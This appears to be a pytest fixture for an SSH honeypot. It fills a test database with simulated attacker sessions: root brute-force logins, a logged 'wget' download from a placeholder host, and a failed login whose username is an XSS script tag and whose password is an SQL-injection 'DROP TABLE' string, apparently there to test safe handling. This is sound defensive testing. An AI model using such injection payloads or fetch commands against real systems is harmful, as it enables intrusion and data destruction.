import sys
from pathlib import Path

import pytest

# make `honeypot` importable when running `pytest` from the repo root without installing
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from honeypot.database import EventStore  # noqa: E402


@pytest.fixture()
def populated_db(tmp_path):
    """A small database with one successful attacker and one failed scanner."""
    db_path = tmp_path / "hp.db"
    store = EventStore(db_path, tmp_path / "events.jsonl")
    sid = store.create_session("203.0.113.9", 50000)
    store.set_client_version(sid, "SSH-2.0-Go")
    store.log_auth(sid, "203.0.113.9", "password", "root", False, password="123456")
    store.log_auth(sid, "203.0.113.9", "password", "root", True, password="root")
    store.mark_login(sid, "root", "root")
    store.log_command(sid, "203.0.113.9", "wget http://x.example/a", "shell", True, 8, ("download",))
    store.log_ioc(sid, "203.0.113.9", "url", "http://x.example/a")
    store.end_session(sid, 12.5, "logout")

    sid2 = store.create_session("198.51.100.2", 40000)
    store.log_auth(
        sid2, "198.51.100.2", "password", "<script>alert(1)</script>", False, password="'); DROP TABLE sessions;--"
    )
    store.end_session(sid2, 1.0, "auth_failed")
    store.close()
    return db_path, sid
